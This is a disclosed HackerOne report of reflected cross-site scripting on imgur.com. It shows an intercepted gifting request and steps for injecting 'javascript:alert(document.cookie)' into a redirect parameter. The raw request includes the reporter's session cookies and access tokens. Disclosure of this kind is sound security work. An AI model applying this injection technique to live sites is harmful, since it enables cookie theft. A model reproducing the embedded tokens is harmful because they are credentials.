# xss reflected on imgur.com

## Report Details
- **Report ID**: 1058427
- **URL**: https://hackerone.com/reports/1058427
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2020-12-14T11:41:49.865Z
- **Disclosed**: 2022-01-22T05:09:48.521Z

## Reporter
- **Username**: ferdihermawan1337
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: imgur

## Vulnerability Information
Steps to reproduce : 
- i log in to my account and navigate to see other profile
- i intercept the request then click Give Emerald

{F1115658}

Request look like : 
```
POST /account/v1/gifting/purchase?client_id=546c25a59c58ad7 HTTP/1.1
Host: api.imgur.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://imgur.com/user/hermawanferdi
Content-Type: application/json
Origin: https://imgur.com
Content-Length: 311
Connection: close
Cookie: postpagebeta=1; amplitude_id_f1fc2abcb6d136bd4ef338e7fc0b9d05imgur.com=eyJkZXZpY2VJZCI6ImM5YzdiYTIxLTAzMjgtNGJkZi05ZGQ2LTE4NDFmZTY2ZGI3Y1IiLCJ1c2VySWQiOiIxMTI1OTYxMzUiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE2MDc5MjQxNTE0MDcsImxhc3RFdmVudFRpbWUiOjE2MDc5MjQ5NzA1ODQsImV2ZW50SWQiOjIwLCJpZGVudGlmeUlkIjozNiwic2VxdWVuY2VOdW1iZXIiOjU2fQ==; is_emerald=0; __qca=P0-164562980-1607924155407; is_authed=1; IMGURSESSION=6bc49554ae5b60f78f6928698819d0aa; SESSIONDATA=%7B%22sessionCount%22%3A1%2C%22sessionTime%22%3A1607924534647%7D; IMGURUIDJAFO=98a32f615768bd72bcfd89f450ea3f8c7a8b83db9647ade587ead48ace80048a; G_ENABLED_IDPS=google; authautologin=b63b9adee68e2e6ff10c0524995762d1%7EhtH5HkdxlstYng81Zq26XEEq7fv7IRra; accesstoken=095cd3db32693c0127c479dfda1fd563c776bdcd; _nc=1; postpagebetalogged=1; frontpagebetav2=1; pp=4807269994624293; fpb-roll=28.099570399611384; __asc=5812397c1765fc71d7f51cf98df; __auc=5812397c1765fc71d7f51cf98df; _ga=GA1.2.509004379.1607924653; _gid=GA1.2.206575419.1607924653; _fbp=fb.1.1607924654910.554323515

{"gifter_id":112596135,"recipient_id":136516779,"amount":1,"redirect_url":"https://imgur.com/emerald/give-emerald?username=hermawanferdi&redirect=https://imgur.com/user/hermawanferdi","source":"User profiler","source_url":"https://imgur.com/user/hermawanferdi","anonymous":true,"post_id":null,"comment_id":null}
```

- i notice "redirect_url":"https://imgur.com/emerald/give-emerald?username=hermawanferdi&redirect=https://imgur.com/user/hermawanferdi"
- i copy the url and change the redirect parameter
- i change the redirect parameter with payload xss "javascript:alert(document.cookie)"
- i open the url on browser
- xss alert

{F1115659}

## Impact

reflected xss / xss attack

## Attachments
- Screenshot_2020-12-14_Imgur.png
- Screenshot_from_2020-12-14_12-56-53.png
